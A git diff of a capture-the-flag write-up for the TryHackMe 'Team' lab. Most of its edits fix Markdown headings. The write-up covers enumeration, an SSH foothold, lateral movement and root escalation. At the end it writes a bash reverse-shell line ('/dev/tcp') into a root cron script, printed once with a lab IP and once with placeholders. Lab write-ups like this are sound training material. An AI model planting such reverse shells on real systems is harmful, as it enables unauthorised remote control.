@@ -1,6 +1,6 @@
-#Team
+## Team
 
-#Enumeration
+# Enumeration
 ```
 # cat nmap/initial
 # Nmap 7.91 scan initiated Fri Mar  5 16:10:39 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,21,80 10.10.142.20
@@ -30,12 +30,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Fri Mar  5 16:10:53 2021 -- 1 IP address (1 host up) scanned in 13.59 seconds
 ```
 
-#Port 80
+# Port 80
 An ubuntu default page, except for the following
 If you see this add 'team.thm' to your hosts!
 so we adjust our /etc/hosts file as such
 
-#team.thm
+# team.thm
 A gobuster directory scan finds us a couple pages but nothing we couldn't find by looking through the page ourselves, so we try and look for subdomains
 
 ```
@@ -134,7 +134,7 @@ REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED
 ```
 We format this according and now have a foothold via ssh as dale
 
-#Horizontal Escalation
+# Horizontal Escalation
 ```
 dale@TEAM:~$ sudo -l
 Matching Defaults entries for dale on TEAM:
@@ -175,7 +175,8 @@ whoami
 gyles
 ```
 we can fix our shell and procede to try and escalate to root
-#Root Escalation
+
+# Root Escalation
 We start by checking gyles home directory for anything interesting
 ```
 gyles@TEAM:/home/gyles$ ls -la
@@ -194,6 +195,7 @@ drwx------ 2 gyles gyles   4096 Jan 15 21:43 .ssh
 -rw-r--r-- 1 gyles gyles      0 Jan 17 15:05 .sudo_as_admin_successful
 gyles@TEAM:/home/gyles$
 ```
+
 .ssh just has a known_hosts file, but .bash_history has not been cleared so lets check it out
 we see mentions of a /usr/local/bin/main_backup.sh file 
 ```
@@ -207,12 +209,13 @@ cp -r /var/www/team.thm/* /var/backups/www/team.thm/
 gyles@TEAM:/home/gyles$ id
 uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
 ```
+
 This file is owned by root and may possibly be part of a cronjob given the operations and hint in the room
 As gyles we are in the admin group so we can insert a reverse shell here and see if we get a callback on our listener
 ```
 gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh
 #!/bin/bash
 cp -r /var/www/team.thm/* /var/backups/www/team.thm/
-bash -c "bash -i >& /dev/tcp/10.13.1.12/4242 0>&1"
+bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
 ```
 Sure enough after a little bit we have a reverse shell spawned on our listener and can claim the root flag in the root directory
